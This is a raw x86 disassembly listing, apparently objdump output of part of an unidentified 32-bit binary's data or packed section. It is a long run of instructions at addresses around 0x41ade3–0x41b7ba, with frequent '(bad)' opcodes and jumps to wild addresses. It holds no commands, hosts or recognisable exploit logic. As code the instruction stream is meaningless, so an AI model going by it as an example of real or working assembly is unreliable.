  41ade3:	add    BYTE PTR [edx+0x242c2d25],cl
  41ade9:	neg    BYTE PTR [edx]
  41adeb:	clc    
  41adec:	cmp    edx,edx
  41adee:	sbb    edi,DWORD PTR [esi+0xb]
  41adf1:	call   0x27dae04
  41adf6:	sbb    bh,BYTE PTR [edi-0x28]
  41adf9:	jmp    0xcdc2ae0c
  41adfe:	loop   0x41adf2
  41ae00:	push   ebp
  41ae02:	jp     0x41ad8a
  41ae04:	add    cl,ch
  41ae06:	push   cs
  41ae07:	jns    0x41ae0f
  41ae09:	sahf   
  41ae0a:	gs je  0x41ae31
  41ae0d:	int    0xf
  41ae0f:	add    BYTE PTR [eax],al
  41ae11:	mov    eax,0xb9fdb257
  41ae16:	sar    BYTE PTR [ecx+0x44],cl
  41ae19:	int    0xbe
  41ae1b:	jge    0x41addd
  41ae1d:	nop
  41ae1e:	sub    DWORD PTR [ebp-0x6effffed],eax
  41ae24:	cmp    eax,0x24ad7100
  41ae29:	add    BYTE PTR [ecx+ecx*4-0x14b2e7e],dh
  41ae30:	(bad)  
  41ae31:	(bad)  
  41ae32:	cmp    DWORD PTR [eax+0x1408848a],ecx
  41ae38:	add    BYTE PTR [eax],al
  41ae3a:	je     0x41ae0a
  41ae3c:	xchg   BYTE PTR [ebp-0x7c],al
  41ae3f:	call   0x641e9660
	...
  41ae64:	jmp    0x60c5ba27
  41ae69:	jns    0x41ae66
  41ae6b:	jmp    DWORD PTR [edi-0x42]
  41ae6e:	inc    eax
  41ae6f:	test   DWORD PTR [ecx+ecx*4-0x19b567e],esp
  41ae76:	dec    DWORD PTR [edx+0x7da2e0]
  41ae7c:	xor    al,0xfe
  41ae7e:	xchg   BYTE PTR [eax+ecx*2+0x24000002],al
  41ae85:	lods   eax,DWORD PTR ds:[esi]
  41ae86:	(bad)  
  41ae87:	push   0x35
  41ae89:	add    ecx,DWORD PTR [esp-0x158]
  41ae90:	popf   
  41ae91:	or     ah,BYTE PTR [eax+ecx*4]
  41ae94:	and    al,0xfe
  41ae96:	dec    DWORD PTR [eax+0x89a170]
  41ae9c:	hlt    
  41ae9d:	std    
  41ae9e:	dec    esp
  41ae9f:	mov    eax,DWORD PTR [ebx+0x65]
  41aea2:	stos   BYTE PTR es:[edi],al
  41aea3:	push   0xffffffe4
  41aea5:	std    
  41aea6:	xchg   al,dh
  41aea8:	jns    0x41af1d
  41aeaa:	je     0x41af1a
  41aeac:	outs   dx,DWORD PTR ds:[esi]
  41aead:	or     DWORD PTR [eax+0x45b6e04b],0x1c
  41aeb4:	jns    0x41ae9d
  41aeb6:	xchg   BYTE PTR [ebx+0xd],cl
  41aeb9:	xchg   DWORD PTR [edx-0x1],edi
  41aebc:	pop    eax
  41aebd:	repnz xor BYTE PTR [eax],cl
  41aec0:	mov    edx,0xe9447941
  41aec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec6:	cdq    
  41aec7:	jecxz  0x41aec9
	...
  41aee5:	add    ah,ah
  41aee7:	xchg   edi,eax
  41aee8:	add    DWORD PTR [esi-0x4b],edx
  41aeeb:	repnz retf 
  41aeed:	(bad)  
  41aeee:	call   0xd97:0x2240817
  41aef5:	inc    edi
  41aef6:	mov    dl,dh
  41aef8:	(bad)  
  41aef9:	jg     0x41af01
  41aefb:	lahf   
  41aefc:	add    DWORD PTR [ebx-0x33],esi
  41aeff:	or     eax,DWORD PTR [eax+0x24]
  41af02:	int    0xae
  41af04:	ja     0x41af66
  41af06:	or     eax,0x12c07e97
  41af0b:	and    dh,BYTE PTR [ebx-0x5]
  41af0e:	pop    edx
  41af0f:	pop    edx
  41af10:	xchg   edi,eax
  41af11:	sub    esp,edi
  41af13:	xchg   esi,eax
  41af14:	jbe    0x41af62
  41af16:	icebp  
  41af17:	rcr    BYTE PTR [ebx+0x196ade3],cl
  41af1d:	data16 xchg bl,cl
  41af20:	fist   WORD PTR [ebx+0x75]
  41af23:	dec    edi
  41af24:	add    al,0x0
  41af26:	or     eax,0x12c7d6f1
  41af2b:	retf   0xf5c0
  41af2e:	xor    eax,0x2d81c3fe
  41af33:	xchg   ebp,eax
  41af34:	call   0xf555:0x832a0a53
  41af3b:	and    ecx,ecx
  41af3d:	(bad)  
  41af3e:	cli    
  41af3f:	adc    eax,0xc20d0407
  41af44:	dec    edi
  41af45:	and    al,0x8d
  41af47:	xchg   esi,eax
  41af48:	add    DWORD PTR [eax],eax
	...
  41af66:	add    BYTE PTR [eax],al
  41af68:	adc    ch,BYTE PTR [edx]
  41af6a:	mov    edi,0xe00059e8
  41af6f:	add    cl,BYTE PTR ds:0xcc79bd21
  41af75:	and    al,0x62
  41af77:	lahf   
  41af78:	mov    si,0x3db
  41af7c:	ret    
  41af7d:	cmp    ecx,ebx
  41af7f:	push   DWORD PTR [ebx-0x2f6c8dd6]
  41af85:	stc    
  41af86:	mov    dh,0xd
  41af88:	dec    ebp
  41af89:	add    BYTE PTR [ebx-0x3],dh
  41af8c:	inc    eax
  41af8d:	cwde   
  41af8e:	inc    edx
  41af8f:	retf   
  41af90:	xchg   ebx,eax
  41af91:	xor    BYTE PTR [edx-0x43],0xeb
  41af95:	mov    ebp,0xb8003eb
  41af9a:	add    edi,eax
  41af9c:	lea    ebx,[ecx]
  41af9e:	jmp    0x41afa3
  41afa0:	jo     0x41afad
  41afa2:	add    edi,eax
  41afa4:	push   eax
  41afa5:	cmp    edi,ebx
  41afa7:	add    bh,BYTE PTR [ebx+0xae03380]
  41afad:	cwde   
  41afae:	enter  0x50a0,0x80
  41afb2:	arpl   bx,ax
  41afb4:	shl    esi,0xd9
  41afb7:	ret    
  41afb8:	add    al,0x3a
  41afba:	jecxz  0x41afa4
  41afbc:	jp     0x41af46
  41afbe:	lahf   
  41afbf:	rol    DWORD PTR [ecx],0x0
  41afc2:	adc    al,0x79
  41afc4:	cmp    DWORD PTR [esi],ebp
  41afc6:	sbb    ch,BYTE PTR [esi]
  41afc8:	mov    eax,0xffbb17
	...
  41afe9:	add    BYTE PTR [edx],bl
  41afeb:	adc    cl,0xfb
  41afee:	adc    edx,ecx
  41aff0:	lods   eax,DWORD PTR ds:[esi]
  41aff2:	dec    esp
  41aff3:	add    BYTE PTR [edx],bl
  41aff5:	test   eax,0x844add8a
  41affa:	push   ds
  41affb:	and    al,0xd8
  41affd:	inc    ebx
  41affe:	or     eax,0xddc8378b
  41b003:	verw   WORD PTR [ebp-0x5d]
  41b007:	add    BYTE PTR [eax],al
  41b009:	jmp    0xf9fdeb63
  41b00e:	dec    esi
  41b00f:	add    BYTE PTR [ecx-0x49],dl
  41b012:	std    
  41b013:	jmp    0xf3cb6a16
  41b018:	sbb    esp,DWORD PTR [esi]
  41b01a:	mov    eax,0xee90027
  41b01f:	jge    0x41b094
  41b021:	icebp  
  41b022:	xchg   ecx,eax
  41b023:	push   ebp
  41b024:	sub    DWORD PTR [ecx],0xffffff99
  41b027:	sbb    DWORD PTR [ebx+0x51000ee9],0x3f
  41b02e:	mov    edx,0x8e39fee9
  41b033:	repz sbb edx,esi
  41b036:	test   BYTE PTR [edi],al
  41b038:	std    
  41b039:	mov    dh,0x84
  41b03b:	inc    eax
  41b03c:	or     eax,0x866d
  41b041:	jmp    0xb65da3d5
  41b046:	add    al,0x5c
  41b048:	adc    BYTE PTR [ecx],ch
  41b04a:	adc    DWORD PTR [ebp+0x76],edi
  41b04d:	icebp  
	...
  41b06a:	add    BYTE PTR [eax],al
  41b06c:	cmp    DWORD PTR [ebx],0x6c
  41b06f:	test   DWORD PTR [esi+0x7f],0x7ced3488
  41b076:	aad    0x30
  41b078:	mov    cl,BYTE PTR [eax+0xd]
  41b07b:	ds inc edi
  41b07d:	or     eax,0x8659a0f5
  41b082:	dec    esi
  41b083:	loope  0x41b09f
  41b085:	or     eax,0xf4128181
  41b08a:	push   es
  41b08b:	push   0xffffffa1
  41b08d:	adc    esi,DWORD PTR [ebx-0x8]
  41b090:	clc    
  41b091:	push   ds
  41b092:	jmp    0x201f4278
  41b097:	ret    
  41b098:	push   es
  41b099:	xchg   DWORD PTR [esi+0x0],ebx
  41b09c:	add    BYTE PTR [ebx+eiz*2-0x77],bl
  41b0a0:	mov    dl,0x10
  41b0a2:	or     esi,DWORD PTR [edi-0x50f4ef4e]
  41b0a8:	mov    dl,0x6
  41b0aa:	or     ebp,DWORD PTR [edi-0x1d8062db]
  41b0b0:	mov    bl,0x5
  41b0b2:	ret    0x1cc1
  41b0b5:	pop    es
  41b0b6:	push   eax
  41b0b7:	inc    DWORD PTR [ebx]
  41b0b9:	(bad)  
  41b0ba:	jns    0x41b0c8
  41b0bc:	ins    DWORD PTR es:[edi],dx
  41b0bd:	mov    eax,DWORD PTR [esi+0x14]
  41b0c0:	sbb    eax,0x9f3b0d62
  41b0c5:	jbe    0x41b0c6
  41b0c7:	mov    BYTE PTR [ebx-0x7f],ah
  41b0ca:	jno    0x41b0e4
  41b0cc:	stos   DWORD PTR es:[edi],eax
  41b0cd:	ja     0x41b0e0
  41b0cf:	inc    DWORD PTR [eax]
	...
  41b0ed:	add    cl,ah
  41b0ef:	adc    ecx,DWORD PTR [edi+0x56]
  41b0f2:	pop    ebx
  41b0f3:	ja     0x41b0fa
  41b0f5:	inc    DWORD PTR [ecx+0x644010ba]
  41b0fb:	mov    eax,DWORD PTR [ecx-0x4]
  41b0fe:	vmptrld QWORD PTR [ebx+0x4]
  41b102:	pop    edi
  41b103:	std    
  41b104:	jo     0x41b11a
  41b106:	add    ch,ah
  41b108:	cmp    BYTE PTR [eax],bh
  41b10a:	add    dh,BYTE PTR gs:0x676485d
  41b111:	jmp    DWORD PTR [ecx]
  41b113:	and    bl,bh
  41b115:	adc    eax,0x401268
  41b11a:	mov    edi,0xa5ff947
  41b11f:	pop    edi
  41b120:	mov    dl,0x3c
  41b123:	add    cl,BYTE PTR [ecx-0x3adc7ba]
  41b129:	adc    eax,0x401604
  41b12e:	daa    
  41b12f:	les    eax,FWORD PTR [esi+eax*1+0x3c6e00d]
  41b136:	test   BYTE PTR [ebp+0x2acb8909],ah
  41b13c:	xlat   BYTE PTR ds:[ebx]
  41b13d:	push   esp
  41b13e:	xchg   esi,eax
  41b13f:	aaa    
  41b140:	ss std 
  41b142:	and    al,0x75
  41b144:	test   DWORD PTR [esi],0xfd05a586
  41b14a:	sbb    edi,ebx
  41b14c:	adc    DWORD PTR [ebx],0xffc17a11
	...
  41b16e:	add    BYTE PTR [eax],al
  41b170:	dec    ebx
  41b171:	push   edx
  41b172:	aas    
  41b173:	jb     0x41b11f
  41b175:	push   cs
  41b176:	test   DWORD PTR [ebx],0xff3a12a5
  41b17c:	stos   BYTE PTR es:[edi],al
  41b17d:	jmp    0x1415:0x763b0c46
  41b184:	jmp    DWORD PTR [esi-0x55cca2ff]
  41b18a:	rcl    DWORD PTR [eax-0x1d],1
  41b18d:	icebp  
  41b18e:	jae    0x41b11b
  41b190:	retf   
  41b191:	(bad)
  41b196:	adc    ch,bh
  41b198:	sbb    BYTE PTR [edi+0x13],bl
  41b19b:	inc    eax
  41b19c:	or     eax,0xc3375c7a
  41b1a1:	pop    esi
  41b1a2:	not    BYTE PTR [ebx-0x40]
  41b1a5:	jns    0x41b215
  41b1a7:	aaa    
  41b1a8:	repz sbb al,0x3d
  41b1ab:	push   ebp
  41b1ac:	xchg   esi,eax
  41b1ad:	and    eax,0xea408908
  41b1b2:	aas    
  41b1b3:	mov    eax,0x6a2b130d
  41b1b8:	or     eax,0x2ab83886
  41b1bd:	push   esp
  41b1be:	sbb    eax,0x8666cd11
  41b1c3:	rol    BYTE PTR [esi-0x8cf7db],0xff
  41b1ca:	gs cmp ch,al
  41b1cd:	jl     0x41b1c3
  41b1cf:	pop    es
  41b1d0:	sbb    al,0xc0
  41b1d2:	out    0x8c,al
	...
  41b1f0:	add    BYTE PTR [eax],al
  41b1f2:	push   ebx
  41b1f3:	add    al,0x6a
  41b1f5:	sub    BYTE PTR [ebp-0x6bf6ae01],dh
  41b1fb:	or     edi,DWORD PTR [edi-0x75]
  41b1fe:	adc    DWORD PTR [eax+0x2e15c6aa],ebx
  41b204:	mov    ecx,0x5873046
  41b209:	(bad)  
  41b20a:	aam    0x3e
  41b20c:	or     BYTE PTR [esi],al
  41b20e:	mov    WORD PTR [ebp-0x15],es
  41b211:	imul   ebp,DWORD PTR [eax+0x35],0xffffffe8
  41b215:	add    edx,DWORD PTR [esi+0x7d]
  41b218:	jnp    0x41b241
  41b21a:	adc    eax,0xff1fd47d
  41b21f:	mov    edi,0xd735e1e6
  41b224:	sub    edi,edx
  41b226:	test   DWORD PTR [ebx+0x38],ebp
  41b229:	rcr    ebp,cl
  41b22b:	mov    ah,BYTE PTR [esi]
  41b22d:	adc    bl,bl
  41b22f:	iret   
  41b230:	pop    edi
  41b231:	mov    BYTE PTR [edx+0x1f1bf47c],0xc0
  41b238:	out    0x34,al
  41b23a:	inc    esp
  41b23b:	ss push ds
  41b23d:	or     al,0x10
  41b23f:	and    DWORD PTR [ebp+0x3],0xd
  41b243:	add    al,dh
  41b245:	fiadd  WORD PTR [esi]
  41b247:	or     eax,0xd866b
  41b24c:	out    0x8c,eax
  41b24e:	adc    BYTE PTR [ebx+0xb86081e],cl
  41b254:	pop    esp
  41b255:	pop    es
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	or     eax,0x9e8ae700
  41b279:	jnp    0x41b20a
  41b27b:	out    0xd8,eax
  41b27d:	(bad)  
  41b27e:	(bad)  
  41b27f:	call   0xfcb5f216
  41b284:	cmp    esi,esp
  41b286:	add    esp,DWORD PTR [esi+0x3]
  41b289:	or     al,0xfd
  41b28b:	aam    0x12
  41b28d:	jge    0x41b302
  41b28f:	loope  0x41b272
  41b291:	jl     0x41b2a6
  41b293:	ins    DWORD PTR es:[edi],dx
  41b294:	sbb    al,al
  41b296:	push   DWORD PTR [ecx+0x5e]
  41b299:	cmp    ecx,esi
  41b29b:	mov    ch,0x1e
  41b29d:	xor    ebx,DWORD PTR [ebx-0x23]
  41b2a0:	loop   0x41b2db
  41b2a2:	push   0xffffffeb
  41b2a4:	mov    ecx,0x229cfcd0
  41b2a9:	out    0xfc,al
  41b2ab:	mov    bh,0xb0
  41b2ad:	jl     0x41b2ac
  41b2af:	cld    
  41b2b0:	mov    cl,BYTE PTR [ebx]
  41b2b2:	inc    eax
  41b2b3:	jmp    0xcdb4f343
  41b2b8:	lea    ecx,[edi]
  41b2ba:	or     al,0xda
  41b2bc:	into   
  41b2bd:	jnp    0x41b30c
  41b2bf:	lahf   
  41b2c0:	lea    ecx,[edi]
  41b2c2:	clc    
  41b2c3:	fxch   st(6)
  41b2c5:	jnp    0x41b31a
  41b2c7:	out    0x24,al
  41b2c9:	add    al,0x11
  41b2cb:	sub    DWORD PTR [ecx],ecx
  41b2cd:	mov    DWORD PTR ds:0xbf777462,ecx
  41b2d3:	enter  0x680f,0xa
  41b2d7:	inc    DWORD PTR [eax]
	...
  41b2f5:	add    BYTE PTR [ecx],dl
  41b2f7:	add    cl,ch
  41b2f9:	aam    0x97
  41b2fb:	add    eax,0x898d2489
  41b300:	pop    es
  41b301:	pusha  
  41b302:	adc    eax,0x60eefcfb
  41b307:	jl     0x41b31c
  41b309:	imul   ebx,DWORD PTR [edi],0x1059ffc0
  41b30f:	jge    0x41b384
  41b311:	xchg   ecx,eax
  41b312:	mov    dl,0xe
  41b314:	sbb    al,0x0
  41b316:	inc    esi
  41b317:	aas    
  41b318:	std    
  41b319:	pop    ebp
  41b31a:	sahf   
  41b31b:	mov    esi,0x1466c956
  41b320:	add    BYTE PTR [ecx-0x9],dl
  41b323:	xchg   BYTE PTR [ecx],bl
  41b325:	sbb    BYTE PTR [esi],al
  41b327:	aas    
  41b328:	std    
  41b329:	push   esp
  41b32a:	mov    ebx,0xbb0c7e8f
  41b32f:	stc    
  41b330:	into   
  41b331:	jmp    FWORD PTR [edx-0x3600acfa]
  41b337:	sbb    dl,BYTE PTR [edx]
  41b339:	inc    eax
  41b33a:	hlt    
  41b33b:	sub    eax,0x22a8c6e9
  41b340:	or     eax,DWORD PTR [ecx]
  41b342:	(bad)  [esi+esi*2]
  41b345:	xor    BYTE PTR [edi],bh
  41b347:	add    ah,BYTE PTR [edi]
  41b349:	lds    esi,FWORD PTR [edi]
  41b34b:	cld    
  41b34c:	aas    
  41b34d:	jb     0x41b2f6
  41b34f:	push   0x4a2f583d
  41b354:	add    DWORD PTR [edx+0x13],ebp
  41b357:	data16 dec BYTE PTR [eax+eax*1+0x0]
	...
  41b377:	add    BYTE PTR [eax-0x5cafb255],dh
  41b37d:	pop    ss
  41b37e:	cld    
  41b37f:	adc    BYTE PTR [esi+edi*8-0x80],ah
  41b383:	shr    cl,0xc
  41b386:	jg     0x41b34d
  41b388:	xor    al,0x37
  41b38a:	cs jb  0x41b348
  41b38d:	in     eax,0x0
  41b38f:	(bad)  
  41b390:	sub    BYTE PTR [eax],ch
  41b392:	or     eax,DWORD PTR [eax]
  41b394:	or     edi,ebx
  41b396:	into   
  41b397:	push   DWORD PTR [edx]
  41b399:	or     al,0x53
  41b39b:	(bad)  
  41b39c:	cmp    DWORD PTR [edx],ebx
  41b39e:	adc    al,BYTE PTR [eax+0x64]
  41b3a1:	mov    BYTE PTR [esp+0x43],al
  41b3a5:	pop    ecx
  41b3a6:	pop    edx
  41b3a7:	pop    ebx
  41b3a8:	int    0xbe
  41b3aa:	cli    
  41b3ab:	xor    eax,0x414d610d
  41b3b0:	or     eax,0xc362b81
  41b3b5:	imul   esi,DWORD PTR [edx],0x4d706ec0
  41b3bb:	inc    ecx
  41b3bc:	or     eax,0xcecc0cc6
  41b3c1:	push   0xa6d914a2
  41b3c6:	add    ecx,eax
  41b3c8:	pop    eax
  41b3c9:	out    dx,al
  41b3ca:	ins    BYTE PTR es:[edi],dx
  41b3cb:	sub    ecx,0xed4b8b0b
  41b3d1:	fmulp  st(7),st
  41b3d3:	pop    es
  41b3d4:	xchg   esp,eax
  41b3d5:	mov    ah,0x65
  41b3d7:	mov    DWORD PTR [eax+0x6b],edx
  41b3da:	mov    WORD PTR [ebx+0x0],cs
	...
  41b3f9:	add    ch,ah
  41b3fb:	fmulp  st(7),st
  41b3fd:	je     0xd5c3219f
  41b403:	push   0x81e14b90
  41b408:	inc    esi
  41b409:	inc    ebx
  41b40a:	fld    DWORD PTR [esi+0x27]
  41b40d:	xchg   DWORD PTR [eax+0xf],ecx
  41b410:	imul   ebp,DWORD PTR [edx+esi*8],0xcfc70167
  41b417:	imul   eax,DWORD PTR [ecx],0x53
  41b41a:	xchg   BYTE PTR [ebx],al
  41b41c:	sub    ah,0xf9
  41b41f:	in     eax,0xe7
  41b421:	out    dx,eax
  41b422:	or     eax,0x150bfce6
  41b427:	xor    ebx,edx
  41b429:	mov    al,bh
  41b42b:	pop    esi
  41b42c:	inc    ebx
  41b42d:	inc    ebx
  41b42e:	jb     0x41b497
  41b430:	neg    BYTE PTR [esi+edx*4]
  41b433:	sub    dl,BYTE PTR [eax]
  41b435:	sub    eax,0x4d83043e
  41b43b:	cmp    ebx,DWORD PTR [eax]
  41b43d:	mov    edx,eax
  41b43f:	pop    esi
  41b440:	mov    BYTE PTR [ebx+0x45],dh
  41b443:	add    BYTE PTR [edi+0x40],ah
  41b446:	repnz xor al,0x13
  41b449:	or     al,0x38
  41b44b:	ret    
  41b44c:	mov    ?,WORD PTR [ebx]
  41b44e:	into   
  41b44f:	ja     0x41b46a
  41b451:	ins    DWORD PTR es:[edi],dx
  41b452:	xchg   esp,eax
  41b453:	repz (bad) 
  41b455:	mov    bh,BYTE PTR [esi+0x97a6a73]
  41b45b:	or     DWORD PTR [ecx+0xf],ebp
	...
  41b47a:	add    BYTE PTR [eax],al
  41b47c:	adc    bh,BYTE PTR [ecx-0x19]
  41b47f:	mov    BYTE PTR [ebx],dl
  41b481:	jge    0x41b4e2
  41b483:	adc    BYTE PTR [eax],dl
  41b485:	jle    0x41b4db
  41b487:	add    al,0xd
  41b489:	add    BYTE PTR [edx],dl
  41b48b:	(bad)  
  41b48c:	dec    BYTE PTR [eax]
  41b48e:	data16 jo 0x41b49e
  41b491:	add    bh,ah
  41b493:	mov    BYTE PTR [ebx+0x4],dl
  41b496:	fs iret 
  41b498:	push   es
  41b499:	or     DWORD PTR [ebx+0x4d],ebp
  41b49c:	or     eax,0x8a74e700
  41b4a1:	jmp    esi
  41b4a3:	add    ecx,ebp
  41b4a5:	or     BYTE PTR [ebx+0x41],ah
  41b4a8:	or     eax,0x3683e700
  41b4ad:	jns    0x41b496
  41b4af:	not    DWORD PTR [esi]
  41b4b1:	jno    0x41b4db
  41b4b3:	add    al,0xd
  41b4b5:	add    BYTE PTR [edi-0x18516ef4],ah
  41b4bb:	add    ecx,DWORD PTR ds:0x6f831885
  41b4c1:	jmp    esi
  41b4c3:	add    ecx,DWORD PTR [ebp-0x3183160d]
  41b4c9:	outs   dx,DWORD PTR ds:[esi]
  41b4ca:	(bad)  
  41b4cb:	mov    BYTE PTR [esi],0xc8
  41b4ce:	push   edx
  41b4cf:	int3   
  41b4d0:	shl    bl,cl
  41b4d2:	add    ecx,esp
  41b4d4:	retf   0xf7f3
  41b4d7:	and    BYTE PTR [ebp+0x3],0x0
  41b4db:	cmp    eax,0xe1e87f25
	...
  41b4fc:	add    BYTE PTR [eax],al
  41b4fe:	inc    edx
  41b4ff:	adc    eax,DWORD PTR [ecx-0x7cf4e16f]
  41b505:	gs push cs
  41b507:	add    BYTE PTR [eax],al
  41b509:	dec    eax
  41b50a:	push   ds
  41b50b:	dec    esp
  41b50c:	inc    ecx
  41b50d:	jmp    0xfc4976f7
  41b512:	and    al,0x7d
  41b514:	rcl    BYTE PTR [edx-0x26ba78e2],cl
  41b51a:	test   edx,ecx
  41b51c:	adc    eax,DWORD PTR [edx-0xeba76b9]
  41b522:	xchg   ebp,eax
  41b523:	retf   
  41b524:	not    DWORD PTR [edx+0x3f]
  41b527:	mov    DWORD PTR [ecx+0xd],eax
  41b52a:	test   cl,cl
  41b52c:	daa    
  41b52d:	inc    edx
  41b52e:	aaa    
  41b52f:	mov    DWORD PTR [ecx-0x27],eax
  41b532:	xchg   ebp,eax
  41b533:	leave  
  41b534:	adc    edx,DWORD PTR [edx+0x2f]
  41b537:	mov    al,BYTE PTR [ecx-0x2f]
  41b53a:	mov    al,BYTE PTR [eax+0x73]
  41b53d:	loope  0x41b580
  41b53f:	mov    bh,0x0
  41b541:	stc    
  41b542:	push   cs
  41b543:	add    BYTE PTR [ebx-0x13],dh
  41b546:	cli    
  41b547:	jbe    0x41b5bd
  41b549:	stos   BYTE PTR es:[edi],al
  41b54a:	cmp    DWORD PTR [edi+0xec900],esi
  41b550:	je     0x41b514
  41b552:	xchg   ebp,eax
  41b553:	rol    DWORD PTR [edi],0x72
  41b556:	lds    ecx,FWORD PTR [ebx]
  41b558:	mov    edi,ebx
  41b55a:	lea    edi,[edx+0xc]
  41b55d:	jne    0x41b58e
  41b55f:	cmp    edx,0xfd
	...
  41b57d:	add    BYTE PTR [eax],al
  41b57f:	add    BYTE PTR [esi+ebx*1-0x7f],bh
  41b583:	stos   DWORD PTR es:[edi],eax
  41b584:	std    
  41b585:	cs push esi
  41b587:	stc    
  41b588:	jge    0x41b5a0
  41b58a:	dec    edi
  41b58b:	cmp    DWORD PTR [esi+edi*4+0x2f04000b],edx
  41b592:	sti    
  41b593:	call   0x418b6e
  41b598:	out    dx,eax
  41b599:	js     0x41b5a0
  41b59b:	test   DWORD PTR [esp+esi*2+0xa],esi
  41b59f:	div    edx
  41b5a1:	(bad)  
  41b5a2:	(bad)  
  41b5a3:	jmp    DWORD PTR [ebx+eax*4]
  41b5a6:	je     0x41b5d3
  41b5a8:	bound  eax,QWORD PTR [ecx-0x4]
  41b5ab:	add    DWORD PTR [edi-0x5fbadaff],ebp
  41b5b1:	(bad)  
  41b5b2:	out    dx,eax
  41b5b3:	sbb    DWORD PTR [ecx],0xffffffe7
  41b5b6:	or     ecx,DWORD PTR [edi]
  41b5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b9:	sti    
  41b5ba:	cli    
  41b5bb:	(bad)  
  41b5bc:	jnp    0x41b63a
  41b5be:	jns    0x41b5bf
  41b5c0:	hlt    
  41b5c1:	outs   dx,DWORD PTR ds:[esi]
  41b5c2:	add    al,0x33
  41b5c4:	and    al,0x35
  41b5c6:	inc    ecx
  41b5c7:	lock sar ebp,1
  41b5ca:	shl    BYTE PTR cs:[ecx+ebx*2+0x836c95b],0x0
  41b5d3:	xor    ah,BYTE PTR [edi+eiz*8]
  41b5d6:	cmc    
  41b5d7:	push   ebp
  41b5d8:	outs   dx,DWORD PTR ds:[esi]
  41b5d9:	call   0xffdea25a
  41b5de:	(bad)  
  41b5df:	inc    DWORD PTR [edi+0x8b5450]
	...
  41b601:	add    BYTE PTR [ecx+0x6447870a],bl
  41b607:	jg     0x41b5c9
  41b609:	jne    0x41b5be
  41b60b:	sub    al,0xc0
  41b60d:	jmp    0x3f2c9f
  41b612:	jl     0x41b616
  41b614:	add    BYTE PTR [eax],al
  41b616:	mov    ah,0x6a
  41b618:	out    dx,eax
  41b619:	push   ebp
  41b61a:	je     0x41b61e
  41b61c:	push   eax
  41b61d:	(bad)  
  41b61e:	leave  
  41b61f:	out    0xe7,eax
  41b621:	mov    dh,al
  41b623:	sti    
  41b624:	dec    DWORD PTR [eax-0x7c47dbf3]
  41b62a:	dec    ebp
  41b62b:	int3   
  41b62c:	pop    eax
  41b62d:	and    eax,0xd087094c
  41b633:	push   eax
  41b634:	or     al,BYTE PTR [edx+0x164cc]
  41b63a:	imul   ecx,DWORD PTR ss:[esi+0x8f13543],0xa703481
  41b645:	cmp    ah,0x64
  41b648:	add    DWORD PTR [eax],eax
  41b64a:	out    0x13,al
  41b64c:	push   0xfd508a0d
  41b651:	call   FWORD PTR [edx]
  41b653:	jmp    0xe1febe98
  41b658:	jae    0x41b5db
  41b65a:	sti    
  41b65b:	pop    edi
  41b65c:	jmp    0x41b67d
  41b65e:	ja     0x41b6c7
  41b660:	mov    ss,esi
  41b662:	xchg   BYTE PTR [esi],dh
  41b664:	mov    WORD PTR [ebx+0x0],?
	...
  41b683:	add    ch,ch
  41b685:	loopne 0x41b646
  41b687:	jecxz  0x41b67e
  41b689:	std    
  41b68a:	jns    0x41b689
  41b68c:	loop   0x41b671
  41b68e:	inc    eax
  41b68f:	or     eax,0x67c91
  41b694:	or     eax,0x96e3f02e
  41b699:	or     eax,0x6734feeb
  41b69e:	imul   edx,DWORD PTR [eax],0x847a16bb
  41b6a4:	int    0x5e
  41b6a6:	jge    0x41b635
  41b6a8:	push   cs
  41b6a9:	addr16 add ebp,edi
  41b6ac:	sbb    BYTE PTR [ebx],al
  41b6ae:	mov    ss,esi
  41b6b0:	daa    
  41b6b1:	imul   ebp,ebx,0x7571aaff
  41b6b7:	std    
  41b6b8:	mov    bl,bl
  41b6ba:	inc    eax
  41b6bb:	or     eax,0x5600089
  41b6c0:	or     eax,0x6eefde00
  41b6c5:	mov    DWORD PTR [ebp-0x1915f112],edi
  41b6cb:	imul   ebp,DWORD PTR [ecx+0x73],0xffffffc6
  41b6cf:	jns    0x41b662
  41b6d1:	inc    eax
  41b6d2:	out    dx,al
  41b6d3:	jg     0x41b6c1
  41b6d5:	add    bh,ah
  41b6d7:	add    edx,DWORD PTR [ebp+edx*8+0x7c88cda]
  41b6de:	jo     0x41b69f
  41b6e0:	ds jnp 0x41b6a5
  41b6e3:	sti    
  41b6e4:	add    eax,0xf95d0
	...
  41b705:	add    BYTE PTR [ecx+0x12],dl
  41b708:	daa    
  41b709:	add    al,0x94
  41b70b:	pop    eax
  41b70c:	ins    BYTE PTR es:[edi],dx
  41b70d:	pop    ebp
  41b70e:	fwait
  41b70f:	sub    al,0x6c
  41b711:	mov    edi,0x3500d042
  41b716:	cmc    
  41b717:	cdq    
  41b718:	add    al,0x79
  41b71a:	add    BYTE PTR [ecx-0x2573ac4c],cl
  41b720:	sub    al,BYTE PTR [edx+ecx*4]
  41b723:	ret    0xd32a
  41b726:	xchg   ebp,eax
  41b727:	inc    edi
  41b728:	and    eax,0x6fffa2bf
  41b72d:	mov    edi,0xe80b67d2
  41b732:	shl    DWORD PTR [ebx+ebp*2+0x44],1
  41b736:	sbb    BYTE PTR [ebx+0x2b],bh
  41b739:	add    al,0xd
  41b73b:	add    BYTE PTR [edi+ebp*8+0x7a],dh
  41b73f:	addr16 out 0xe7,eax
  41b742:	mov    cl,0x74
  41b744:	(bad)  
  41b745:	out    dx,eax
  41b746:	retf   0xac88
  41b749:	pop    edi
  41b74a:	retf   
  41b74b:	mov    edx,0xbad30401
  41b750:	stc    
  41b751:	add    ecx,DWORD PTR [edx-0x6e030016]
  41b757:	jne    0x41b765
  41b759:	fimul  WORD PTR [eax+0xee90220]
  41b75f:	xchg   DWORD PTR [ecx],eax
  41b761:	push   0xfffffff6
  41b763:	add    ecx,DWORD PTR ds:0x2086b
  41b769:	jmp    0x41b76e
	...
  41b786:	add    BYTE PTR [eax],al
  41b788:	and    ecx,eax
  41b78a:	repz test BYTE PTR [ebp+0xee90204],0x87
  41b792:	dec    ecx
  41b793:	in     eax,dx
  41b794:	mov    ebp,0xee900b4
  41b799:	and    BYTE PTR ds:0xfd74bf6d,cl
  41b79f:	jmp    0xe64e2f2d
  41b7a4:	mov    WORD PTR [edi-0x1],fs
  41b7a7:	call   0xe90125ba
  41b7ac:	add    eax,0xee8dd7c
  41b7b1:	add    BYTE PTR [edx-0x3f83d6d2],cl
  41b7b7:	hlt    
  41b7b8:	push   ss
  41b7b9:	ins    DWORD PTR es:[edi],dx
  41b7ba:	mov    edi,0x1ee9
